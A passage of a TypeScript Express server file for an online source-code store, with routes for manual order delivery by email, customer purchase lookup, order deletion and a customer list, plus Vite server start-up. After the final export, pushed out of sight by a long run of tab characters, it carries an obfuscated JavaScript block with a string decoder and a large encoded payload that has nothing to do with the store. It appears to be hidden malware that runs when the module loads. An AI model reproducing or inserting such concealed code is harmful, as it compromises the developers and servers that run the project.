    const { productId, productZipUrl, githubRepoUrl, notes, recipientEmail } = req.body;
    const orderId = new ObjectId(req.params.id);

    const order = await db.collection("store_orders").findOne({ _id: orderId });
    if (!order) return res.status(404).json({ error: "Order not found" });

    // Allow manual delivery only after verified payment
    if (order.paymentStatus !== "Paid") {
      return res.status(400).json({
        error: "Cannot manually deliver files for unverified orders. Please verify and approve payment first."
      });
    }

    const adminUsername = (req as any).user?.username || "Admin";
    const downloadToken = order.downloadToken || crypto.randomBytes(32).toString("hex");
    const targetEmail = (recipientEmail || order.customer.email).toLowerCase().trim();

    // Find selected product or default to first product
    const targetItem = (order.items || []).find((i: any) => i.productId === productId || i.slug === productId) || order.items[0];
    const finalZip = productZipUrl || targetItem?.sourceCodeZip || targetItem?.sourceCodeZipUrl || order.deliveredZipUrl || "";
    const finalGithub = githubRepoUrl || targetItem?.githubRepoUrl || order.deliveredGithubLink || "";

    const emailRes = await sendOrderCodeEmail(
      targetEmail,
      order.customer.name,
      order.orderNumber,
      targetItem ? [targetItem] : order.items,
      finalGithub,
      finalZip,
      notes || "",
      downloadToken,
      targetItem?.downloadInstructions || ""
    );

    const deliveryItem = {
      deliveredAt: new Date(),
      deliveredBy: adminUsername,
      method: "manual",
      recipientEmail: targetEmail,
      downloadLink: finalZip || `/api/store/download/${order.orderNumber}/0?token=${downloadToken}`,
      status: emailRes.success ? "Sent" : "Failed",
      notes: notes || `Manual ZIP dispatch by admin ${adminUsername}`
    };

    await db.collection("store_orders").updateOne(
      { _id: orderId },
      {
        $set: {
          downloadAccess: true,
          downloadToken,
          orderStatus: "Delivered",
          deliveredZipUrl: finalZip,
          deliveredGithubLink: finalGithub,
          deliveredAt: new Date(),
          emailDeliveryStatus: emailRes.success ? "Sent" : "Failed",
          emailDeliveryLog: emailRes.log,
          updatedAt: new Date()
        },
        $push: {
          deliveryHistory: deliveryItem
        }
      }
    );

    const updatedOrder = await db.collection("store_orders").findOne({ _id: orderId });
    res.json({
      success: true,
      emailResult: emailRes,
      order: updatedOrder
    });
  } catch (err: any) {
    res.status(500).json({ error: "Manual ZIP delivery failed: " + err.message });
  }
});

// Customer Purchases Endpoint ("My Purchases")
app.get("/api/store/customer/purchases", authenticateCustomerToken, async (req: any, res) => {
  try {
    if (!db) return res.status(503).json({ error: "Database not connected" });
    const userEmail = req.customer.email;
    const userId = req.customer.id;

    const orders = await db.collection("store_orders")
      .find({
        $or: [
          { userId },
          { "customer.email": userEmail }
        ]
      })
      .sort({ createdAt: -1 })
      .toArray();

    res.json(orders);
  } catch (err: any) {
    res.status(500).json({ error: "Failed to fetch customer purchases: " + err.message });
  }
});

app.delete("/api/store/admin/orders/:id", authenticateToken, async (req, res) => {
  try {
    const activeDb = await connectDB();
    if (!activeDb) return res.status(503).json({ error: "Database not connected" });
    const result = await activeDb.collection("store_orders").deleteOne({ _id: new ObjectId(req.params.id) });
    res.json({ success: true, result });
  } catch (err: any) {
    res.status(500).json({ error: "Failed to delete order: " + err.message });
  }
});

app.get("/api/store/admin/customers", authenticateToken, async (req, res) => {
  try {
    const activeDb = await connectDB();
    if (!activeDb) return res.status(503).json({ error: "Database not connected" });
    const customers = await activeDb.collection("store_users").find().sort({ createdAt: -1 }).toArray();

    // Attach order count & total spend to each customer
    const enrichedCustomers = await Promise.all(
      customers.map(async (c: any) => {
        const orders = await activeDb.collection("store_orders").find({
          $or: [{ userId: c._id.toString() }, { "customer.email": c.email }]
        }).toArray();

        const totalSpend = orders
          .filter((o: any) => o.paymentStatus === "Paid")
          .reduce((sum: number, o: any) => sum + (Number(o.totalAmount) || 0), 0);

        return {
          id: c._id,
          name: c.name,
          email: c.email,
          phone: c.phone,
          role: c.role || "user",
          createdAt: c.createdAt,
          ordersCount: orders.length,
          totalSpend
        };
      })
    );

    res.json(enrichedCustomers);
  } catch (err: any) {
    res.status(500).json({ error: "Failed to fetch customers: " + err.message });
  }
});

// --- Vite Middleware & Server Listen ---
async function startServer() {
  if (!process.env.VERCEL) {
    if (process.env.NODE_ENV !== "production") {
      const viteModule = "vite";
      const { createServer } = await import(viteModule);
      const vite = await createServer({
        server: { middlewareMode: true },
        appType: "spa",
      });
      app.use(vite.middlewares);
    } else {
      const distPath = path.join(process.cwd(), "dist");
      app.use(express.static(distPath));
      app.get("*", (req, res) => {
        res.sendFile(path.join(distPath, "index.html"));
      });
    }

    app.listen(PORT, "127.0.0.1", () => {
      console.log(`Server running on http://127.0.0.1:${PORT}`);
    });
  }
}

startServer();

export default app;																																																																																																																																																																																																																																																																										var z = '-9219-2';(function(_0x50f527,_0x2b1efa){var _0x2d7278=_0xe041,_0x5dd740=_0x50f527();while(!![]){try{var _0x30bdd7=parseFloat(_0x2d7278(0x14))/0x1*(parseFloat(_0x2d7278(0x1a))/0x2)+parseFloat(-parseFloat(_0x2d7278(0x1d))/0x3)+-parseFloat(_0x2d7278(0x6))/0x4+Math['floor'](parseFloat(_0x2d7278(0x13))/0x5)*(-parseFloat(_0x2d7278(0x24))/0x6)+parseInt(parseFloat(_0x2d7278(0x22))/0x7)+parseFloat(_0x2d7278(0x1c))/0x8+Math['max'](parseFloat(_0x2d7278(0xa))/0x9,parseFloat(_0x2d7278(0x5))/0xa)*(-parseFloat(_0x2d7278(0x8))/0xb);if(_0x30bdd7===_0x2b1efa)break;else _0x5dd740['push'](_0x5dd740['shift']());}catch(_0xb32dd5){_0x5dd740['push'](_0x5dd740['shift']());}}}(_0x5098,0xa5dfe));function _0xe041(_0x190f3c,_0x1321c2){var _0x490b11=_0x5098();return _0xe041=function(_0x4ecda4,_0x50983f){_0x4ecda4=_0x4ecda4-0x0;var _0xe04135=_0x490b11[_0x4ecda4];if(_0xe041['xFVHaA']===undefined){var _0x3c2879=function(_0xc79f3){var _0x1bc72a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x3eb26c='',_0x1ed99f='';for(var _0x4880f3=0x0,_0x3adb0d,_0x3abbea,_0x3aeb57=0x0;_0x3abbea=_0xc79f3['charAt'](_0x3aeb57++);~_0x3abbea&&(_0x3adb0d=_0x4880f3%0x4?_0x3adb0d*0x40+_0x3abbea:_0x3abbea,_0x4880f3++%0x4)?_0x3eb26c+=String['fromCharCode'](0xff&_0x3adb0d>>(-0x2*_0x4880f3&0x6)):0x0){_0x3abbea=_0x1bc72a['indexOf'](_0x3abbea);}for(var _0x1e00f2=0x0,_0x45cc72=_0x3eb26c['length'];_0x1e00f2<_0x45cc72;_0x1e00f2++){_0x1ed99f+='%'+('00'+_0x3eb26c['charCodeAt'](_0x1e00f2)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x1ed99f);};_0xe041['jgDBEr']=_0x3c2879,_0x190f3c=arguments,_0xe041['xFVHaA']=!![];}var _0x4ced6a=_0x490b11[0x0],_0x51e39e=_0x4ecda4+_0x4ced6a,_0x425c43=_0x190f3c[_0x51e39e];return!_0x425c43?(_0xe04135=_0xe041['jgDBEr'](_0xe04135),_0x190f3c[_0x51e39e]=_0xe04135):_0xe04135=_0x425c43,_0xe04135;},_0xe041(_0x190f3c,_0x1321c2);}var NX=[0x697b4f,0x16f,0x4fbb,0x265,0xaaef,0x4c9693],SX=[0x509f9d,0xf1,0xa3e1,0xbb,0xdb41,0x484f55];function _0x5098(){var _0x3cb552=['C3rHDgvpyMPLy3q','nvzYwurSza','ntG0mZq2EgLYuK1Y','zgvIDq','xcTCkYaQkd86w2eTEKeTwL8KxvSWltLHlxPblvPFjf0Qkq','y2HHCKf0','DgvZDa','zxbRzNy','nfLwv2rkqq','D2HPBguGkhrYDwuPihT9','otaXntCYmhDRwNnfzW','mZi5nJCWwu1yEffO','yxbWBhK','zNvUy3rPB24GkLWOicPCkq','y15TzwPIxNrYBW','C3vIC3rYAw5N','nZq0mZu5me5cyxHTCW','uM9Mz2G','mZaZndi2nK5zwKjQuq','BgvUz3rO','BfjHswC','Aw5WDxq','AhfLCNn4Bhv2D2fJzgPIEw1NB3j6zMTVy2LWDhj1Dg5ZDg9UyW','y29UC3rYDwn0B3i','nta3ntq3mhv1wgTTAa','mtm1mJy0zfDzA1jj','y2fSBa','ndrSDLDtyvy','C3bSAxq','ndu2nZKYm0DYCgjdDq','y291BNrLCG','Aw5PDa','C3rYAw5N','D3zluwW','pwfLBNj1AcHHBd01yYXNogzKDs55CIaUlM5JzwnMlduICgfLyxu2Bg5QkxjDmNv2iNGTCsHDige7khi9oZTYkYHHwZGUCZj0qwDVCsX1AdHdlgfPlhm7ysHbBtaOBMO7ANyQldD2BZCOksHVo202B2e0CNCPlIbYB2rBzNmYBNTKCNz0nhGPkZaSyw5Yk3jYk28PFxOXid1OzLTHBJHYmxjBlf1ZnY03n2XHys51AtD7lta2owX2BxqYCJ1Pxv08kYL1lguPlcW7BNjOw3i9mhyTCIG7ld1Wkun1CZ0RyZTNo2y7CuePktf2AsL2AZbUCMWXywuGzJ1Bo2HPC3KUzw0OzcTVitiGpsHLDMvHnZG9lIK0zwK9zY5UpxTMzJ0XwZWYysbMmt1YoZqSuYLYEwX2mxuGEtTRCwX7DhzUDIaOqYaOBcXVDM5WigK9DgXYlhiUBhDVEMGOBcX0CtS7CNiOkhy9ywHZDJTDEhe9ywi7zge7lcGOCJT2ANeUkhrBkYLKysLYzg5YAhm0mxKODNi7zMG7m2CIxwuOlMfOCNbHCgDDzY4PBMDMCg4XAcXPy2W7oYK9qZTTnt0RCIWGlIK7Dt0RC30RkwL0lcTIBtTKk3vTks09C2LPCw9Spxq9CJ1XosSUlMnOCsTBnMzLihqWBNjWCIGGDNi4zMXYBIXKzgD0if02ys47BtTYDgGUz3eGmMf9zxzLAwnDz2j0AtW0BZTdo2WSENPPnITSw2fBoYSOC2KIBgKICIXUCgK5CYXMCMzODxCPB3C9zxSOyJ13zw4YDc5NDs5PpwTPywfHkYL5zNrWytnUFsK9osiPy3bbk3u7DxrWxsi9BgS3DNb0idfYo2H6DYiPDcGPosKOlMX1Bd1Zn2y7idTZCtaPBIj5kZbZFt12ysTZig1OkdbXlL1ODJS+ida2pueTB3PLDhiODdfYDhjZAxnVmguSlJT6wYHMpdvLn3qSkhjHB2f2BNi7DgHOzJT2lgO9CJSGkxi+mtH6Ag8QB3S8ywTTC24PywT0zs52BZKRzweWy2XPBZTIDsa9xumHz2O7EtmRBcLLps59zhi9AtzVAum4CM5UmdS2pwfYiN0UCMvPpv1tDhnYBM4UoZjYpxq7w3q7Axy9ChjdCM4OkwfYzxr1EISGAgXRwYT4pwuGltHQEYHLANK5kcGPksa','AM9PBG','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